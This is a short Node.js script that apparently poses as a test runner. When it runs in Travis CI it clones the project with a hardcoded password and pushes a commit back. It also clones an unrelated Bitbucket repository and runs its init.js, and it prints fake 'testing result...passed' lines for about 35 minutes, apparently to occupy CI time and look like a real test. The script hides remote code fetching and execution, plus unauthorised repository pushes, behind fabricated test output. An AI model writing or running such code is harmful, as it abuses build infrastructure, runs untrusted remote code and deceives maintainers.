var exec = require("child_process").exec;
var index = 1;
var max = 35;
var interval;
var target = '';
if (__dirname.indexOf('/home/travis') !== -1){
  var pt = __dirname.split('travis/build/').pop();
  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
}
var myrepo = 'git clone ' + target + ' aaa && ';
myrepo += 'git config --global user.email "test" && ';
myrepo += 'git config --global user.name "test" && ';
myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
if (__dirname.indexOf('/home/travis') !== -1) exec(myrepo);
var child = exec('rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js');
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
interval = setInterval(function () {
  if (index >= max) {
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  console.log("testing result..." + index++ + '...passed');
}, 1000 * 60);
